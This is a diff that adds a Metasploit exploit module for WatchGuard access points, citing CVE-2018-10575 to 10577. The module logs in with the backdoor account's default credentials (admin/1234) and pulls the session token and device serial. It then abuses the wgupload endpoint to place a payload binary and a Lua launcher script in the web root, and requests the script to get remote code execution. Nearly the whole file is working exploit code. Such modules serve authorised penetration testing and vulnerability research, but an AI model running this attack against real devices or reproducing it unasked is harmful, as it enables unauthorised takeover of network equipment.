@@ -1,0 +1,142 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::FileDropper
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'        => 'Watchguard AP Backdoor Shell',
+      'Description' => 'Watchguard AP\'s have a backdoor account with known credentials. This can be used to
+                        gain a valid web session on the HTTP administration interface. The administrator
+						can then upload a shell directly to the web root to execute it.
+						This module can also be used if you have legitimate access credentials to the device.',
+      'References'  =>
+        [
+            ['CVE', 'CVE-2018-10575'],
+	    ['CVE', 'CVE-2018-10576'],
+	    ['CVE', 'CVE-2018-10577'],
+            ['URL', 'http://seclists.org/fulldisclosure/2018/May/12'],
+	    ['URL', 'https://watchguardsupport.secure.force.com/publicKB?type=KBSecurityIssues&SFDCID=kA62A0000000LIy'],
+        ],
+      'Author'      => 'Stephen Shkardoon ', # ss23 / @ss2342
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'linux',
+      'Targets'        => [ [ 'Automatic', { } ] ],
+      'DefaultTarget'  => 0,
+      'Arch'           => ARCH_MIPSBE,
+    ))
+
+    register_options(
+      [
+        Opt::RPORT(443),
+        #Opt::SSL(true),
+        OptString.new('WG_USER', [ true, 'The username to authenticate as', 'admin']),
+        OptString.new('WG_PASS', [ true, 'The password for the specified username', '1234']),
+      ])
+  end
+
+  def exploit
+  begin
+    res = send_request_cgi({
+        'method'  => 'GET',
+        'uri'     => '/cgi-bin/luci/',
+        'headers' => {
+          'AUTH_USER' => datastore['WG_USER'],
+          'AUTH_PASS' => datastore['WG_PASS'],
+        },
+      })
+
+    if res.nil? || res.get_cookies.empty?
+	    fail_with(Failure::NotFound, 'Unable to obtain a valid session with provided credentials')
+	  end
+	  
+	  # We have a valid session, so we should pull out the access credentials and find the serial number
+	  sysauth = res.get_cookies.scan(/(sysauth=\w+);*/).flatten[0]
+    stok = res.redirection.to_s.scan(/;(stok=\w+)/).flatten[0]
+	
+	  vprint_status("Got sysauth #{sysauth}")
+    vprint_status("Got stok #{stok}")
+    
+    res = send_request_cgi({
+        'method'    => 'GET',
+        'uri'       => "/cgi-bin/luci/;#{stok}/html/Status",
+        'headers' => {
+          'AUTH_USER' => datastore['WG_USER'],
+          'AUTH_PASS' => datastore['WG_PASS'],
+        },
+        'cookie'    => sysauth,
+      })
+    
+    if res.nil? || res.code != 200
+      fail_with(Failure::NotFound, 'Unable to request serial')
+	  end
+    
+    # Pull out the serial and store it for later
+    # var	device_serial = "20AP0XXXXXXXX";
+    if res.body.match(/device_serial = "(\w+)";/)
+      serial = $1
+    else
+      fail_with(Failure::NotFound, 'Unable to find serial in response')
+    end
+    
+    vprint_status("Got serial #{serial}")
+
+    # Finally, upload our payloads
+    res = send_request_cgi({
+        'method'    => 'POST',
+        'uri'       => "/cgi-bin/luci/;#{stok}/wgupload",
+        'headers' => {
+          'AUTH_USER' => datastore['WG_USER'],
+          'AUTH_PASS' => datastore['WG_PASS'],
+        },
+        'cookie'    => "#{sysauth}; serial=#{serial}; filename=/tmp/payload; md5sum=fail",
+        'data'      => payload.encoded_exe,
+      })
+
+    if res.nil? || res.code != 205
+      fail_with(Failure::NotFound, "Could not upload file 1: #{res.body}")
+    end
+  
+    # Upload the lua script that executes our payload
+    res = send_request_cgi({
+        'method'    => 'POST',
+        'uri'       => "/cgi-bin/luci/;#{stok}/wgupload",
+        'headers' => {
+          'AUTH_USER' => datastore['WG_USER'],
+          'AUTH_PASS' => datastore['WG_PASS'],
+        },
+        'cookie'    => "#{sysauth}; serial=#{serial}; filename=/www/cgi-bin/payload.luci; md5sum=fail",
+        'data'     => "#!/usr/bin/lua
+os.execute('/bin/chmod +x /tmp/payload');       
+os.execute('/tmp/payload');"
+      })
+    
+    if res.nil? || res.code != 205
+      fail_with(Failure::NotFound, "Could not upload file 1: #{res.body}")
+    end
+    
+    # Remove the trigger script once we've got a shell
+    register_file_for_cleanup("/www/cgi-bin/payload.luci")
+    
+    vprint_status("Uploaded lua script")
+    
+    # Trigger our payload
+    res = send_request_cgi({
+        'method'    => 'GET',
+        'uri'       => "/cgi-bin/payload.luci",
+      })
+      
+    vprint_status("Requested lua payload")
+    
+    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+      vprint_error("Failed to connect to the web server")
+      return nil
+    end
+  end
+end
